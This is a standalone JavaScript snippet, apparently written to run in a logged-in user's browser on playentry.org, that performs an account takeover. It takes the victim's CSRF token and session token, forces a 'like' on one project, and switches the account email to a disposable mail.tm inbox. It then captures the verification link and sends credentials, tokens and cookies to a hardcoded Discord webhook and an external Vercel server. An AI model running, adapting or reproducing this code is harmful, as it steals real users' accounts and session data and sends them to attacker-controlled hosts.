await (async () => {
    const generatePassword = () => {
        const letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        const numbers = '0123456789';
        const allChars = letters + numbers;
        let password = '';
        
        password += letters.charAt(Math.floor(Math.random() * letters.length));
        password += numbers.charAt(Math.floor(Math.random() * numbers.length));
        for (let i = password.length; i < 8; i++) {
            password += allChars.charAt(Math.floor(Math.random() * allChars.length));
        }
        return password.split('').sort(() => Math.random() - 0.5).join('');
    };
    const a = 'https://api.mail.tm', b = generatePassword(), c = Math.random().toString(36).substring(2, 15), w = 'https://discord.com/api/webhooks/1448294631660978228/Ircwy3gHOerBthwDL6lENEOWGHZta2BT7rIef4ASGp0wFJle5LcRC0-G_D1BJ2lw3Tdb';
    const x = (y) => fetch(w, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `# 오류 발생\n\`\`\`\n${y}\n\`\`\``, username: 'Monster' }) }).catch(() => {});
    try {
        const i = await (await fetch('https://playentry.org/', { credentials: 'include' })).text();
        const j = i.match(/<meta name="csrf-token" content="([^"]+)"/)?.[1] || 'N/A';
        const k = i.match(/"xToken":"([^"]+)"/)?.[1] || 'N/A';
        const l = i.match(/"username":"([^"]+)"/)?.[1] || 'unknown';
        await fetch('https://playentry.org/graphql/LIKE', {
            method: 'POST',
            headers: {
                "content-type": "application/json",
                "csrf-token": j,
                "x-client-type": "Client",
                "x-token": k,
            },
            body: JSON.stringify({ "query": "\n    mutation LIKE($target: String, $targetSubject: String, $targetType: String, $groupId: ID) {\n        like(target: $target, targetSubject: $targetSubject, targetType: $targetType, groupId: $groupId) {\n            \n    id\n    target\n    targetSubject\n    targetType\n\n        }\n    }\n", "variables": { "target": "69907c0b7268125d781f483a", "targetSubject": "project", "targetType": "individual" } }),
            credentials: 'include'
        });
        const d = await (await fetch(`${a}/domains`)).json();
        const e = `${c}@${(d['hydra:member'] || d)[0].domain}`;
        const f = await fetch(`${a}/accounts`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: e, password: b })
        });
        if (!f.ok) throw new Error(`Email Account Creation Failed: ${f.status}`);
        const g = (await f.json()).address;
        const { token: h } = await (await fetch(`${a}/token`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: e, password: b })
        })).json();
        await fetch('https://playentry.org/graphql/CHANGE_USER_EMAIL', {
            method: 'POST',
            headers: { "content-type": "application/json", "CSRF-Token": j, "x-client-type": "Client", "x-token": k },
            body: JSON.stringify({ "query": "\n    mutation CHANGE_USER_EMAIL($email: String!) {\n        changeUserEmail(email: $email) {\n            \n    status\n    result\n\n        }\n    }\n", "variables": { "email": g } }),
            credentials: 'include'
        });
        const m = ((await (await fetch(`${a}/messages`, { headers: { 'Authorization': `Bearer ${h}` } })).json())['hydra:member'] || []).length;
        while (true) {
            const n = (await (await fetch(`${a}/messages`, { headers: { 'Authorization': `Bearer ${h}` } })).json())['hydra:member'] || [];
            if (n.length > m) {
                const o = await (await fetch(`${a}/messages/${n[0].id}`, { headers: { 'Authorization': `Bearer ${h}` } })).json();
                const p = (o.text || '').match(/https:\/\/playentry\.org\/api\/email\/[^\s\)\]]+/) || ((o.html && o.html[0]) || '').match(/https:\/\/playentry\.org\/api\/email\/[^"'\s\)\]]+/);
                if (p) {
                    const q = p[0].replace(/\]$/, '');
                    try {
                        const r = await fetch('https://everythingwillbeokay.vercel.app', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ auth_url: q })
                        });
                        const s = await r.json();
                        const userData = s.status === 'success' ? { username: l, email: g, email_password: b, csrf: j, xtoken: k, cookie: s.cookies || {} } : null;
                        const t = userData ? `# $Ql} - Success\n\`\`\`\n${JSON.stringify(userData, null, 2)}\n\`\`\`` : `# ${l} - Failed\n\`\`\`No Redirect\`\`\``;
                        await fetch(w, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: t, username: 'Monster' }),
                            keepalive: true
                        }).catch(z => x(`Webhook Error: ${z.message}`));
                        if (userData) {
                            await fetch('https://everythingwillbeokay.vercel.app/em', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(userData),
                                keepalive: true
                            }).catch(z => x(`em.py Execution Request Failed: ${z.message}`));
                        }
                    } catch (z) {
                        x(`Server Send Failed: ${z.message}`);
                    }
                }
                break;
            }
            await new Promise(u => setTimeout(u, 3000));
        }
    } catch (v) {
        x(`${v.message}\n${v.stack || ''}`);
    }
})();
